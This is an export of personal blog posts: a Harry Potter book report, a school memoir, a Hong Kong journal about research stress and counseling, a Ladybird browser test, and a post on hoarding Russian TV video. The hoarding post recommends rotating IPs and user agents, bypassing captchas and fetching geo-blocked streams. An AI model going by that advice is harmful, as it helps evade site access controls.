stone. Then Dumbledore came and destroyed the stone, one of Voldemoret's horcrux.\n\nAfter adding 170 points, Gryffindor won the House Cup.\n\n### Part Two A-Surprising-But-Reasonable Plot\n\nFor a moment he could see nothing but dark fire, then he was on the other side, in the last chamber.\n\nThere was already someone there---but it wasn't Snape. It wasn't even Voldmort.\n\nIt was Qurriel.\n\n![alt text](https://cdn.jimchen.me/56a8ea39-01a2-4109-9120-f11819cbcc09_image-14.png)\n\n### Part Three My Idea\n\nIt is finally the end of book. When I was reading through, I didn't even pause to finish it. It is just too exciting, attracting and well-organized.\n\nBoth chapter sixteen and sevented showed us how Harry managed to get the Philosopher stone. It showed Harry's brave personality and also his selflessness. It vividly described his braveness. As we all know, Harry Potter is a first-year Hogwarts student. He isn't skilled in magic and was almost nothing comparing to the experienced Hogwarts teacher. However, Harry stood up to Qurriel. We can identify that Harry is really a brave boy.\n\nBut why can't Qurriel just shout a killing curse and kill Harry in one second like Voldemort did to others. Because Qurriel just can't touch Harry without suffering terrible pain. And why is that? It is because Qurriel's a villian, a person who is nasty and mean. All he cared is fame, wealth, and power while Harry is a noble, integrity man. It used magic to show the contrast of their characteristics.\n\nI must also mention Ron and Hermione. Ron is a kid who is not willing to study. Because he was born in a pure-blood family that he is close to magic before, which is why he wasn't as curious as Harry and Hermione. However, he discovered his special ability in chess, which result in helping Harry doing it.\n\nHermione looks like a nerd from the outside, but is really not like that in reality. She is a muggle-born, who were laughed at. That's why she acted like she know everything to make people impressed. Though after long. her real personality became clear. Also adventurous, Miss Granger is loyal to friends, which is why she cannot be absent on the adventure to overthrow Qurriel.\n\nCompared with Malfoy, Crabble, and Goyle, they three seemed more intelligent and braver, in other words better and selfless. The reason is that Harry and his companys always cooperate and never suspects each other in friendship. Malfoy and his gangs are just over-confident and proud, which result in nothing in reality.\n\nWe must also know that the real bad guy isn't always the man who acts mean, but a person like everyone else who won't make sounds to let the others notice him, giving himself more time to think and do dark things.\n\nAt last, Dumbledore came again. All the book, Dumbledore played an important part in making things for Harry. He gave Harry the invisibility cloak and made the Mirror of Erised. It is just that Dumbledore gave the chance to Harry to be a hero. I'm sure that Dumbledore gave many other students the chance. And at a certain point it is left for the person himself to go forward.\n\nThe book is mainly about people's desire, about powers and controls. It is so vividly described that we can almost imagine it's really happening in London. This book is the best book I've read and contained as much information as a-300-pages book can.\n\n\n![alt text](https://cdn.jimchen.me/f9a75221-d189-4af4-8d6b-b36dc2d2aac8_image-15.png)\n![alt text](https://cdn.jimchen.me/7df9ae7e-fe4d-400c-a5a2-92b58f99cc32_image-16.png)\n![alt text](https://cdn.jimchen.me/e1295710-6382-470f-9ccd-a3054da97c80_image-17.png)\n\n## Conclusion\n\nHarry Potter and the Sorcerer's Stone is a great book and, in short, is the best book I've ever read.\n\nThe book symbolizes the danger of desire, the necesity of curiousity, and complex lifes in the same place. I was wondering about frienship: how Harry, Ron, and Hemione combine together but Malfoy, Crabbe, and Goyble didn't have any achievement. The reason is clear, we must trust each other and be eager to sacrifice our own. That's what makes up friendship.\n\nThere is another point, which is the complex personality of students and teachers who live in the same place. Dumbledore, Mcgonagall, and Harry stand for power and fairness while the other side Snape and Malfoy stand for unfairness and pride. We must know where we belong to,and choose between the two sides.\n\nThe dangers of desire also played quite a part. It shows we must not be confused by money or power to rule the world. That is, in other words, cowardice. And the real bad guy isn't who acts badly but a person who hides and will be least suspected, concluded to Snape and Qurriel's act.\n\nNow let's dig something out from these characters in the book. The main character and also the main protagonist is undoubtedly Harry Poter. He is brave kind-hearted, and curious. If it isn't his bravery, he would die by fighting Qurriel and may ne would not even the stone in the first place. If it isn't for his kind-heart, for his thought to protect Hogwarts from being invaded, he wouldn't risk his life for Hogwarts, the place where he discovered friendship and warm for the first time in his life. If it wasn't for his curiousity, he wouldn't wander around, trying to discover something in Hogwarts. He might even not try to think about Nicholas Hamel. Without even one of these factors, he might be a normal student and his fame would die down slowly.\n\nHowever, I might not mention intelligence because it was foolish to try to be caught searching for things that a first year doesn't care about, just for confusion that he must be intelligent.\n\nThe most annoying character is Draco Malfoy. Born in a pure-blood family. He is nothing but a greedy boy. Quite like Dudley. He is a child who hang round with two stupid guys, in order to try to bully someone. Everytime be appeared, something not-so-good will happen, which made me want to punch him in the face. He symbolited unfairness and snobbery. He is a nasty boy with no real things inside.\n\nIf I am the author, I will rather wrote \"I killed Voldemort and destroyed the stone, now there is no longer a threat to the wizarding world\" in Dumbledore's words in P298 instead of \"He is still out there somewhere\" It kept a feeling not-so-good in my heart.\n\nHowever, in the long seven book struggle, and in order to show Dumbledore's greatness, the book ended with Dumbledore rewarding Harry. And it also told us that Voldmort is hard to defeat, that we have to try everything, even sacirfice our own lives sometimes to succeed and achieve a goal.\n\n![alt text](https://cdn.jimchen.me/6c7848f7-45a3-40b4-adae-d605db72fd6f_image-18.png)\n![alt text](https://cdn.jimchen.me/10331889-b7ad-4ca0-9a61-7ff01605ecd4_image-19.png)"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dedc"}, "title": "My Sixth-grade Life", "date": {"$date": "2017-02-01T16:24:00Z"}, "type": "journal", "access": 1, "body": "I've always wanted to write a memoir. There are no better ways to record\nyour life, the ups and downs, and what was worth remembering. But after\neighth grade scarce was my time. So I procrastinated for a long time.\nThis is the memoir of sixth grade. It may be childish and naive but it\nwas how I really felt.\n\n## Prologue\n\nAfter I returned to China with an excellent memory of my year and\nsummer, I went to Shibei Middle School.\n\nThings had been harder and different between middle school and\nelementary school. Life now isn't as good as my previous life. And I am\ngoing to tell you about my life here.\n\n## My New Busy Life\n\nWhen I came back from America, I rested for two days. I came home at\nmidnight and was not tired at all because I slept a lot on the plane. I\nturned on the lights and read a book by Ann M Martin. I didn't look up\nfor three hours when reading and realized that it is morning by the time\nI finished.\n\nI played for two days. On the third day, which is pretty hot, we moved.\nWe lived far from my middle school, so my family and I decided to move\nto a nearer house. The new house is on the twenty-ninth floor. Then I\nwent to the military training in our school. It's so boring that I\ndidn't want to do it. The teacher makes us do things like calling\nnumbers one by one and standing. It is so stupid and dumb. Later I read\nin a newspaper that Americans don't have to do military training. I kind\nof wished I was born in America so that I could skip military training.\nThen finally the last day arrived. We had a competition between classes\nto see which class does the best in the training. To my surprise, our\nclass won out of nine classes and got a prize. Then the new semester\nstarted.\n\nThere are many differences. I used to finish my homework at five or six\no'clock in the evening in primary school, I usually do some math\nproblems late in the evening and often finish them and start playing at\nseven or eight o'clock. Now it had been so different. The first Monday,\nI went to a geometry class. It was already eight-thirty when I was home.\nThen I did all my homework until ten.\n\nWe have three math classes every day. The teachers don't use the\noriginal math textbook but give us tests, which were much harder. We\nhave two math teachers. Mr.\u00a0Chen taught the extra class Monday and\nTuesday. Mr.\u00a0Xu taught the extra class Wednesday and Thursday and the\nnormal math class. He is very strict.\n\nWe had a math test every two days. And this was just the beginning. Our\nmiddle school is so good at math that every year we got the most prizes\nin math competitions in Shanghai.\n\nI used to read an English book a day, which I now tried to do, but\ncouldn't bear it with the homework. I had more and more and more\nhomework than before and the English books I read are harder. So far, I\ncouldn't read 366 books, the same amount of days this year, if the\nteachers keep the homework like that. I wanted the average amount to\nreach one book a day. And there was another solution to this problem,\nwork until ten or eleven every day.\n\nThere was another serious problem. I wasted too much time on the\ncomputer. The teachers always put the details of homework online, and I\nhave to find it using the computer. Pressure began to rise in my heart.\nAnd, as I found out, that if one day there was not much homework, I will\nnever waste time on the computer, but if there was too much of them, I\nwould waste a lot of time on screen. I hate to admit it, but I was\nsometimes a procrastinator and would postpone work. After that, I became\nangry at myself and was often not in a very good mood many days.\n\nHow I am jealous of the elementary school students! I also wanted to be\nin Smic Middle School. I thought I did the wrong choice for middle\nschool. I got myself in here and will never get out, homework and\npressure will only increase in the following years. Then look at Smic\nMiddle School, they went home by four while we went home by six. They\nfinish homework by six or seven while we do it by nine. They have an\neasy math test once a week or less. We have four hard math tests or more\na week and the teacher said that we are going to have eight tests a week\nlater on.\n\nI had a hard time writing Chinese compositions, not English, of course.\nI am good at English, especially after reading so many books. But I had\nread little Chinese books, and our teacher let us write an essay every\nday in Chinese. I always waste time on it, so that's why I did the\nhomework so late.\n\n## The Division\n\nWe have an English song every week. I like \"what makes you beautiful\"\nbest. I also like \"one direction\".\n\nWe had a class song competition. Our class chose roar. We practiced hard\nbut only got third prize.\n\nI didn't pass the Intermediate Interpretation contest, which is of\ncourse hard. I didn't get a prize in either English or Chinese, and I\nfelt bad. Luckily, I got a good score on the midterm examination.\n\nOne of our students got chickenpox, and our class gets separated. Our\nautumn outing was canceled. Most of my classmates are happy to hear it,\nbut I am not. I still want to go to the autumn outing.\n\nIn my class, it is so hard to be the highest score on quizzes. After\nevery test, the teacher writes our rank in a corner of the test paper.\nIt is a real keen competition in my class. There was a stark contrast in\nprimary school, but there's isn't much difference between the best and\nthe worst one now. There are thirty-two students in my class. In the\nmath test, I went from the first one (except that many students are also\nmy score) to the twentieth-first.\n\nBut I liked one thing, which is there is little math homework. Mr.\u00a0Xu\nthinks that our class and class six---the best two classes in sixth\ngrade in our school---should be divided into two classes to separate the\ngood ones and the not-too-good ones.\n\nThis good thing turned upside down when we started to divide into two\nclasses, which is definitely the worst idea ever invented. We started to\nhave much math homework since then.\n\nI was divided into the fast class, and Mr.\u00a0Xu said that the worst one in\nthe last class will go to the slow class. I am likely the worst in\ngeometry, while the fast classes teaching about lines and angels and all\nthat. Later, Mr.\u00a0Xu said that we would be learning about congruent\ntriangles and similar triangles. I was about to be kicked out.\n\nThere's a sick feeling in my stomach every time Mr.\u00a0Xu walked in. I felt\nnervous talking to him because he talks with a blaming tone. He hates\ntwo things, cram class and feeling too well. That's right in some ways,\nbut he kind of goes too far. That's math class becomes my worst class\never since.\n\nWhen someone laughed Mr.Xu would say, 'What's funny?' He would then let\nthat person stand up and ask them questions, even if that person didn't\ndo anything.\n\nHe thought that when any of us smiling, we didn't focus. But how would a\nperson focus so long under great pressure?\n\nWe had a test. It is about parallel lines and equivalent angles. Mr.\u00a0Xu\nthreatened us that whoever gets too low in the test will go to the slow\nclass. I think I did really badly on the test. I hope the score will\nnever be announced.\n\nMr.\u00a0Chen never goes too far. I don't know why. Maybe he just don't like\ndealing with people.\n\nThe score was finally announced and it looks like a nightmare. I kind of\nshivered all through it. Finally, my score was announced and I got the\nlowest score--the teacher announces the worst score at last. I got\n'25+'. That was the worst test I took since I went to Shibei Middle\nSchool. I am lucky. The teacher didn't write my real rank.\n\n## Final Exams\n\nIt's time to leave the division and the math classes to come back to\nfinal exams.\n\nIn primary school, there are just three subjects (Chinese, Math, and\nEnglish). But now, there are also Geography, Computer, and Science. I am\nalso finishing my 366 books.\n\nI was not just busy, I was restless and frustrated. Though I kind of\nadjusted my life here, I couldn't bear it. I needed to prepare for the\nexpository and narrative writings; review the ordinary math, ('cause we\nare too fast and I got less than eighty on the mock test and I was not\nsatisfied with the result); do the computer homework; go over geography,\nand science. Moreover, I need to spend another half hour every day\nreading a book.\n\nIn the last, I got a bad score in Chinese and the minor subjects. I just\nwasn't accustomed to so many subjects. Many of my classmates studied\nphysics early and they knew all about science.\n\nTime is really slow when you want it to be fast, and really fast when\nyou want it to be slow.\n\nThe first semester of sixth grade ended just like that, marking the end\nof one-eighth of my middle school life."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dedd"}, "title": "Media Hoarding", "type": "web-dev", "access": 1, "body": "## Why do Data Hoarding?\n\nSo basically as the data is exploding, doing data hoarding is quite beneficial\n\n1.

Websites: Forum(Discourse or Reddit) Data, YouTube data(channels, comments, videos), Instagram Data, News Channels, Vkontakte, Bilibili, Twitch\n\nThis falls into a legal gray area, and is generally accessible (using various gray methods like switching useragents and ips with a GUI javascript crawler like Selenium or Puppeteer, sniffing the m3u8 or reverse engineering Javascript code, bypassing captchas) This is like a summary or generalization of all humans see or interact with on those websites(except humans don't remember things well, it's like jotting down every details humans would see and feel on those websites)\n\n3. Torrents (or data sharing platforms): Rutracker, 1337x, Bflix, Dark Web leaks...\n\nThis falls into a completely illegal area, and engaging in such behaviors for a long time (without extensive care or protective measures) will have a huge chance in reputation damage, fines, ISP letters, suspension of accounts, being hacked or being fed malware, being arrested.... \n\nWell, however, for large companies trying to gain a competitive edge on data, they might do it(and face some fines perhaps but they have professional legal teams anyways).\n\nThat said, there are also legal torrents, like when you download the iso of ArchLinux you can download a torrent file(which decentralizes and downloads faster), so yeah, technology can be used for good causes.\n\n## Where to Store(or Distribute)\n\nS3 compatibles comes as a top chocies for storing and distributing data.\n\nS3 compatibles are much cheaper than HDD or SSDs, and it is scalable, accessible, and the most widely used. Most media platforms use S3 compatibles for storage, and utilize a CDN for distribution. \n\nFor individual(like me), storing things in S3 in quite an obvious solution. Consumer oriented apps like Google Drive or Dropbox are less scalable, less customizable, and less compatible with each other.\n\nI can store archives in cold storage(not instant retrievable) and more frequent datas in hotter storages(like Standard IA).\n\nFor distributing those data, I can just use static web hosting(but in most cases I might want to use a CDN). CDN comes at a huge cost, so utilizing Cloudflare is obviously another goto choice. Cloudflare has a really generous completely free tier. \n\nCold Storages comes at a price of like 1-4 dollars a month per TB, while Hot Storages are usually more expensive, ranging from 10-20 dollars a month per TB. Cloudflare stands out as an excellent choice.\n\nAlist is a very good frontend for S3 compatibles.\n\n## Hoard Things to S3\n\n```\nrclone move \"examplefile\" \"b2:jimchen4214-public/videos/examplefile\"\n\nrclone copy /home/ubuntu/ r2:jimchen4214-public/videos/... -P --transfers=40 --include \"*.mp4\"\n```\n\n\n\n## Smotrim\n\nFormat: m3u8, extremely easy to crawl with `yt-dlp`\nLanguage: ru\n\n1. There are different media types, including podcasts, videos, brand(I think it means Movies and TVs)\n2. Most videos follow the format of `https://smotrim.ru/video/NUMBER`\n3. Length vary, but most TV show episodes are 40-60 minutes\n4. By entering `https://smotrim.ru/video/NUMBER` you can sometimes get a video, and sometimes it will return 404. The numbers range from 1 to at least 2848324\n5. Many videos are protected and shows \"\u041f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u0430 \u0441\u0435\u0442\u0435\u0432\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430\" without a Russian IP in the frontend, but the m3u8 is still fetchable and you can use `mpv` with `yt-dlp` to play it easily with the url, for example: `mpv https://smotrim.ru/video/2228159`. Some movies are locked behind a paywall(but videos seem free as long as your IP is in Russia)\n\nExample URL:\n```\nhttps://smotrim.ru/video/2820848\nhttps://smotrim.ru/video/2847857\n```\n\nThe movie Ekaterina(2014) first season:\n```\nhttps://smotrim.ru/video/1146653\nhttps://smotrim.ru/video/1146654\nhttps://smotrim.ru/video/1146655\nhttps://smotrim.ru/video/1146817\n```\nThen it went to \n```\nhttps://smotrim.ru/video/2228158\nhttps://smotrim.ru/video/2228159\n...\nhttps://smotrim.ru/video/2228163\n```\n\nThus this makes raw sequential scraping harder. A scraper can either \n\n1. Scrap 2 million urls for some metadatas and put it in a database, like the show name and episodes, then do aggregation. This is quite expensive(but not undoable, and by the large scale the scraper might be blocked or limited)\n2. Scrap movies(or shows) at `https://smotrim.ru/brand/NUMBER` like `https://smotrim.ru/brand/58458`, then aggregate the video urls for each episodes. All metadata information are available without Javascript, by using `wget` only.\n\n## 1TV News\n\nFormat: m3u8, extremely easy to crawl with `yt-dlp`\nLanguage: ru\n\n1. There are multiple streams a day, with 21:00 generally being the longest.\n2. They follow the format of `https://www.1tv.ru/news/issue/YYYY-MM-DD/HH:00#N`\n3. Each is 30 min - 3 hours\n4. The format can date back to at least 2010, but you need some tweaking for older dates, as they don't concat the videos by default, so like fetching videos from #1 to #13 or #17..., but since 2019 you can get the full length video by entering the `https://www.1tv.ru/news/issue/YYYY-MM-DD` and wait for a redirect\n5. Some Olympic stuff are geo protected\n\nExample URL:\n```\nhttps://www.1tv.ru/news/issue/2024-07-11/21:00\nhttps://www.1tv.ru/news/issue/2024-08-09/21:00\n```\n\n## Total Size Estimate\n\nFrom 2018-2024 it is estimated to have around 2000 hours of 720p videos, which is around 3-5 TB.\n\n\n## Do I need a CDN?\n\nFor pure video storing, I always wondered if I need a CDN for storage. I don't think I need one. I think single location storage is fine.\n\nI am the only one consuming those videos, so the server wouldn't be under significant load. When I try to watch the video, utilizing a CDN can make my browser fetch it with less latency, but during me watching the video, the browser (firefox) automatically fetches the next few seconds of a video, creating a buffer, so CDN doesn't make a difference unless I watch with a lot of rewinding and fast forward.\n\n## Why Choose Cloudflare R2?\n\nThe key idea is that Cloudflare R2 has low storage fees(10 dollar per TB per month), and no egress fees. Egress fees are scary when I consume videos like this, say, AWS or GCP's egress fees are like 100 dollars per TB outbound. Cloudflare, however, has 0 egress fees.\n\nSee https://getdeploying.com/reference/data-egress\n\nBackBlaze B2 also seems a great choice, but Cloudflare is a bigger company and I couldn't retrieve my previous BackBlaze account I deleted. Backblaze also have a crappy UI. I also like Linode, but Linode is very expensive(20 dollar per TB per month).\n\n## Good Sources\n\nLIke there are so many videos out there but good video source is definitely something hard to find. Considering video quality, type, length, it's like less than 0.1 percent of videos qualify for the right kind in all random videos out there.", "date": {"$date": "2024-08-10T20:05:03.329Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dede"}, "title": "Some Updates in Hong Kong", "type": "journal", "access": 1, "body": "Anyways I arrived in Hong Kong in around like 7.9, and I first met the teacher Gary Chan, and he assigned me some work. However, my research here is going a total disaster, and I became very very sad and miserable.\n\n## Grad Student's Code\n\nSo like there is a grad student who had written some TCN code, and I was supposed to look at it. But like there was too many obvious mistakes, like, just too much shit in his code in almost every blocks. \n\nLike these mistakes include: Using a sliding window but throwing away 99 percent of data by hardcoding the length you need to traverse to get the sliding window, Mixing the Training and Validation data, Cheating by manipulating the testing data. \n\nWell these mistakes makes me seriously question the Integrity of HKUST, and like how crappy this school's PHD research really is? I thought as a novice everyone should be better than me, but what the hell is that?\n\n## Unable to Implement Code from a Paper \n\nSo I read a TCN paper and couldn't do it and it was pretty confusing how they did it. Anyways I ended up emailing the author(ended up using their personal Outlook Mail I searched from Google instead of the crumbling France mail server they had in the paper) trying to get a source code, but they wouldn't give me. Like there is no way the loss could go down or like this will lead to any result. Made me pretty mad.\n\nThe professor kinda wanted me implement or \"reproduce\" some results from papers I guess, but he recommends me some really shitty papers from like crap Chinese universities no one's ever heard about.\n\nAnyways, pretty soon people started ghosting me. I would post a lot of my thoughts into the group chat and nobody would respond or react. I feel very annoyed. I hate the goddamn WeChat but there wasn't anything I can do about it.\n\n## Sleeping Schedule Problems Again\n\nBasically I ended up again into this stay up all night schedule, and there is little I can do about it because I got literally mentally broken.\n\n## Signing up for Counseling then Canceling it\n\nI saw on the website that I am available for mental counseling, then I quickly signed up for it, thinking I am eligible. The counselor called Stephanie sent me back a email saying \"she isn't available at that time slot and we can adjust it to 11 am\", and I replied, I was like \"fine\", to which she didn't reply. I was using AWS SES SMTP these days anyways. Then I went to the counseling at August 7th at 11am, then the manager tells me Stephanie wasn't available at 11 am, and I have to come at 4:30(the original time slot) again. Coincidentally, my mom showed up at 4:00, so I have to meet with my mom instead of going to the counseling. I mean, I didn't know the probability of these things happening but they do happen. The result is that I went there and got it canceled.\n\nPlus also they used PHP code on their website, which is quite slow, and they frequently claimed your data is confidential while you must sign in, so nothing is confidential anyways, and even E2E and open source code on a malicious server won't be confidential. I already suffered from assuming something is confidential once. I am not gonna assume it again, only if you connect to a website through a tor endnode and go against browser fingerprinting with anonymous names(which is quite irrelevant).\n\nI later went to mental counseling again, and I met with a counselor named Will. I told Will about my anxiety and worries about computer science, how I lost my hobbies and got isolated with friends, how I couldn't find anything else to do, etc. Will seems a nice guy, but I don't think he understand my struggles. He recommended me trying to find other activities to do other than computer science.\n\n## Cognitive Decline\n\nI suffered strong cognitive declines these days, including not being able to find paper and cotton swabs in Grocery Store, and not being able to figure out how to use common apps. I didn't know how to use the Sim card. I couldn't log in to the app. Things haven't improve a little bit and I doubt they will, and I couldn't figure out how to use Discord or anything now. Well, I guess that this is the cause of me messing up with the HongKong pass in the first place. Chinese mandarin is simply too hard for me.\n\nMoreover, they use traditional Chinese and Cantonese, which sounds like jibberish.\n\nI used many days figuring out how to use the School email system or connect to wifi, when I finally learned how to use it(then I learned I cannot keep the mail when I leave, most likely because they don't wanna pay the Azure fee). HKUST uses Outlook, so basically I set up email forwarding to process all my emails in my AWS workmail with Lambdas and backed to S3.\n\nThen again like I spent almost 30 days trying to figure out how to get the student card, and the process was just too complicated for me, and the teacher repeatedly asked me to do it and do it faster, but I just couldn't figure out how to do it easily. Well, I finally did it on the end of July, signed up and yeah, got my student card from the locker room, but then the student card was only gonna be used for 30 days.\n\n## Disinterest in Doing Things\n\nI spent most of the time confined in the dorm or the Starbucks or a strange  auditorium playing my laptop. It is kind of hot, and whenever I go out I sweat. So I have zero interest in going anywhere.\n\nI also have few interest in almost everything these days.(well I did watch the Olympics) \n\n## Setting up Decentralized Servers\n\nI set up my Peertube and Mastodon(something I have been trying to do for a really long time). But anyways I finally did this again. Like basically back in March I couldn't figure out how to configure the Postgres and SMTP. I joined Mastodon Social in May but then quit. Mastodon Social server is too liberal and makes me very uncomfortable.\n\nI set up my server successfully and I am starting to post in my Mastodon Servers and Peertubes.\n\nI also set up Metabase backed with my favorite database MongoDB to visualize the finance data.\n\n## About Research\n\nSo like here in research I was supposed to work with another person, but she couldn't figure out how to effectively use Github, so there is nothing I could do actually, and she didn't communicate much with me(like I had thoughts and like but I received no response or anything). She tried to train a TCN but ended up wasting a lot of resources with the validation loss not going down(massive overtraining), and then presenting the results without looking at the logs. Also she forgot to inverse scale the results of her useless crap of overtraining. She also messed up the sliding window completely. And yeah, so I am mostly on my own, since the grad student and the so called teammate was pretty much useless. \n\nI fucked up last year in the Deep Learning course and I had a horrible time with Resnets or LSTMs, so I had to review it all again. Oh how stupid and lazy was I to study these concepts like I haven't known them at all. Anyways, turns out like I did seem to learn something more, though I am trash as hell anyways.\n\nThen I tried to apply those methods like LSTM and Transformers back into the localization problem, and fed in those data. But I am getting nowhere and the result is just purely horrible. At least I know they can fit, but the validation is having extremely high turbulence and the testing result is having high variance, it overfits all the time.\n\nI tried to read some code from a paper but it was like a lot of data preprocessing problems and I couldn't do much without a good partner. So I am pretty doomed to failure here.\n\n## About Stupid Laptop Problems\n\nBy the way I also changed from Debian to Fedora. Fedora is much better though, like the Debian insisted on using the free libre AMD driver, causing problems like glitches in Wayland, Chromium crashing the Gnome Shell, and Firefox being laggy. Anyways, none of these problems happen in Fedora, thanksfully. But from the user experience there is almost no difference in Gnome in Debian, Fedora and ArchLinux, so yeah, except like in Debian you have to upgrade a lot of packages to newest(like nodejs was like 18 on it, and you have to upgrade to 22, and then nodejs updated got a problem).opportunity\n\nI previously blamed the Firefox problem on Mozilla, but it ended up to not be Mozilla's problem. Anyways as Google Chrome is banning Ublock Origin I am endoring Mozilla right now, and I am also using Thunderbird and K9 email clients(with my AWS SES as server).\n\n\n## About Meeting with USTC teachers\n\nThere was a meeting on the end of July with USTC teachers(like all students here gather for a meeting), and like everybody was talking about how he or she felt and \"suggestions\", and I didn't talk much, mainly like how I was like not gaining progress and mostly focused so there wasn't much I perceived anyways.\n\nThe other students mainly talked about like the diverse life in HongKong, but it was too hot for me to go out anyways. They also talked about like how they were doing a lot of valuable research with lots of different students(which is really cool).\n\nAlso I thought nobody from USTC likes using YouTube or data hoarding or self hosting, so I really couldn't relate to them. I was previously using YouTube quite a lot but recently like I tried to stop my media addiction by using LibRedirect to open the FreeTube on Firefox, and utilizing NewPipe(a really good client for not only YouTube but also Chaos Computer Club and any Peertube instances), but like nobody was interested in any \"hobbies\" of mine.\n\nThe teacher mentioned that Hong Kong can \"give you an excellent immersive opportunity to learn English\", which though, made me quite wonder why they didn't talk in English right there, but for me it was quite opposite as Mandarin was a lot way harder than English, and I identify English as my native language.\n\n## About Start of Semester in HKUST\n\nWell it wasn't start of semester for me though. as my semester back in USTC will start in September, but in August 9th people are coming back to HKUST, and there are quite a lot of them with student clubs posters all over the walls.\n\n![Image](https://cdn.jimchen.me/4e31c4b9-21d7-49b1-885a-ad34e8269d19-1723582589874.jpg)\n\nBut unfortunately I am interested in None of any clubs. I did sent two emails to computer science club but got no response, very sad.\n\n## About Guards on Campus\n\nThere are a lot of police guards here in HKUST, so much that in 2 am if you go out you can find 1 guard every 100 meters. It feels like being watched(though they don't do much to you). \n\nWhen I was at the beach at 3 am police cars zoomed by occasionally.\n![Image](https://cdn.jimchen.me/b8bac942-658b-46e1-8d6b-f75190006d71-1723582757038.jpg)\n\n![Image](https://cdn.jimchen.me/50e66163-5fe4-4bcf-99cf-8195582ac66b-1723582738300.jpg)\n\n## About My Mom's Visit\n\nJust some normal talks which leads nowhere and it's not like it helped anyways, but I thought like at least my parents are the only person left in the world to care even a little about me though? Anyways, i should and I am very grateful always to my parents.\n\n## Conclusion\n\nYeah, so that is like somewhat conclusion of my life from coming here to the middle of August, and it's not like its changing much, but I need to remind myself I am better off then a lot of blue collar workers anyways. It's like, the hopelessness keep building up and nothing changed here. \n\n## Other Photos\n\n![Image](https://cdn.jimchen.me/7f09ee40-a414-4a7f-9b39-1464fe3e4150-1723582808820.jpg)\n\n![Image](https://cdn.jimchen.me/e381ecc1-4ced-4635-b981-43a924f9cbbf-1723582823247.jpg)\n\n![Image](https://cdn.jimchen.me/178bc755-b801-49bb-8b3a-75bed1348180-1723582838642.jpg)\n\n\n\n", "date": {"$date": "2024-08-13T20:13:36.658Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dedf"}, "title": "Trying Out LadyBird", "type": "linux", "access": 1, "body": "\n## Current Situation\n\nBasically there are 3 kinds of browsers left, like the dominant one is Chromium based browsers(which is integrated into Electron apps), then there is firefox, then there is WebKit-based(webkitgtk) based like Safari or Gnome Epiphany or KDE Konqueror.\n\nSo recently [Chrome is warning users they will ban Ublock Origin](https://github.com/uBlockOrigin/uBlock-issues/issues/3309), mainly, as people discussed, trying to put ads on YouTube for money(for free users). [Users, on the other hand, are warning Google they might use Firefox](https://old.reddit.com/r/uBlockOrigin/comments/17wu2gz/google_confirms_they_will_disable_ublock_origin/).There are workarounds but like it's just quite stupid.\n\nFirefox has an awesome list of addons and it's quite good, which is what I am using daily right now. (Also Firefox Nightly) I don't really mind a lot of things and like the browser is customizable, it's fast and light, and everything is fine. There are some font problems(if you don't allow sights to use their own fonts), but everything is working now.\n\nEpiphany isn't quite good and competent with these 2, and I don't know how to use MacBooks, so I don't know how to use Safari.\n\n## Trying Out Ladybird\n\nLIke I am getting quite excited for the idea or Serenity OS and the Ladybird, like basically it is really easy to build and works out of the box (even when its pre-alpha)\n\nI am so surprised it worked this well(like seamless on my Fedora), compiling packages usually include a lot more than this.\n\n![Image](https://cdn.jimchen.me/30e4c555-b89c-42bd-b95c-8a878f80999d-1723727966651.jpg)\n\n![Image](https://cdn.jimchen.me/7b253e8a-808a-4aeb-94b2-cb49d479503b-1723727959377.jpg)\n\n## NextJS\n\nWorks but with some limitations\n\n![Image](https://cdn.jimchen.me/f969eaa6-9912-4cbf-ab99-2e232aacb17b-1723728070793.jpg)\n\n\nMainly the margins and paddings ain't polished, if you click the TOC in my blog it does go there albeit the TOC would disappear(in chrome or firefox it stays).\n\n## Google\n\n![Image](https://cdn.jimchen.me/a8cff7da-e848-4d4d-afd7-b94d72f8bfc0-1723728220631.jpg)\n\nWorking but with severe limitations\n\nThe Google Help started flashing literally\n\n![Image](https://cdn.jimchen.me/9b5df69f-f3b9-4597-a7cb-1d54f56e9dbd-1723728269942.jpg)\n\n## DuckDuckGo\n\n![Image](https://cdn.jimchen.me/c3614674-0339-444c-988f-129790eacf80-1723728315024.jpg)\n\nTreats the search bar as static text.

I tried playing some videos on my Cloudflare R2 Bucket directly and it couldn't. YouTube won't play (although it showed subtitles).\n\n## Some Logs\n\n![Image](https://cdn.jimchen.me/d8f28c4b-ffdd-45af-9b96-caf6f5505a22-1723728657205.jpg)\n\n## Conclusion\n\nLadybird looks pretty solid for non-video contents, and it's better on old fashioned PHP websites. It lacks so much polishing but it haven't reached Alpha yet. I am thankful again for the open source community to design so many interesting things and they make me happy!", "date": {"$date": "2024-08-15T12:53:32.626Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee0"}, "title": "My Relationship with Social Media & Smartphone", "type": "journal", "access": 1, "body": "## Introduction\n\nMy relationship with social media is a very unconventional one. Social media, obviously, is a huge part of the today's world, especially in GenZ. Most of my peers grow up with social media. Some people engaged in it every day(with those vibes and trends). \n\nAs a GenZ, the impact of social media on my life is somewhat complicated and I am going to write about my journey with it throughout the years.\n\n## The Early Days(Pre 2020)\n\nMy first encounters were like in around 2016, I didn't know how to use a computer by the way back then. I just found out about forums and mostly browsed them instead of actively engaging with anything. \n\nI didn't know that the popular people (household names), some of them have those Twitter or Instagram accounts. I didn't even know what Twitter or Instagram was, (or even what Weibo was, back before 2020).\n\nSocial media didn't change my communication habits at all. In middle school I was the only one not to have a smartphone. I communicated primarily through emails or phone calls (and the majority communication was proxied through my parents).\n\nI didn't have one social media account at all(or a smartphone, I only used a stupid phone without web) before 2020.(or middle school graduation) Also, my family isn't a restrictive, conservative family, nor are my parents illiterate. In fact, my father graduated from tech-related PhD, and my parents are very permissive, granting me all my wishes and doing their best for my growth.\n\nI just didn't feel like using a smartphone. There was this strong feelings against it, like, because the screen is very small and people waste time and life on it. I hate it so much that I became the last person in my middle school class to use a smartphone. \n\nIn my middle school my brain space was quite small, too small to be distracted with a smartphone, which constantly beeps and uses a proprietary complex system that I have no idea of. I went to the metro and 5 out of 6 people are scrolling endlessly with blank expressions on their faces. The stupid phone (Philip) also uses a proprietary system, but it was fine, though, as the most advanced functionality was SMS.\n\nIn conclusion it just felt meaningless and distractive for me in middle school, and at that time I read a lot of literature 